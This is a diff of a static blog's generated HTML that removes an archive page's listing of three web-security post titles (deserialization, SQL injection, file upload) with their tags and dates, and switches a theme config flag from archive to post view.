-	  <a class="archive-article-title" href="/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank">反序列化</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">反序列化</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/web//" class="article-tag-list-link color4">web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/sql%E6%B3%A8%E5%85%A5/" class="archive-article-date">
-        <time datetime="2024-04-01T02:43:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-04-01</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/sql%E6%B3%A8%E5%85%A5/" target="_blank">SQL注入</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">SQL注入</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/web//" class="article-tag-list-link color4">web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="archive-article-date">
-        <time datetime="2024-04-01T02:33:36.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-04-01</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" target="_blank">文件上传</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">文件上传</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/web//" class="article-tag-list-link color4">web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/page/4/">&laquo; Prev</a><a class="page-number" href="/archives/">1</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/3/">3</a><a class="page-number" href="/archives/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/archives/page/6/">6</a><a class="extend next" rel="next" href="/archives/page/6/">Next &raquo;</a>
-    </nav>
-  
 
 
           </div>
@@ -935,8 +653,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: true,
